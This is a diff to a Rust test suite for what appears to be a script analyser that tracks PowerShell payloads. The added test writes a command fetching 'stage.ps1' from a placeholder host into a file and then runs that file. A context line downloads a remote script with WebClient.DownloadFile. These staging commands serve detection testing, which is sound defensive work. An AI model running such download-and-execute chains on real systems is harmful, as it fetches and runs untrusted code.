@@ -18472,6 +18472,24 @@ powershell -NoProfile -File "%TEMP%\copied.ps1""#,
     }
 
     #[test]
+    fn powershell_set_content_value_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-set-content-value.example/stage.ps1".to_vec();
+
+        interpret_line(
+            r#"powershell -Command "Set-Content -Path C:\Temp\stage.ps1 -Value 'Invoke-WebRequest https://ps-set-content-value.example/stage.ps1'""#,
+            &mut env,
+        );
+        interpret_line(r#"powershell -NoProfile -File C:\Temp\stage.ps1"#, &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Set-Content -Value script content was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
     fn powershell_copy_item_preserves_download_provenance() {
         let report = analyze(
             br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-copy-item-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
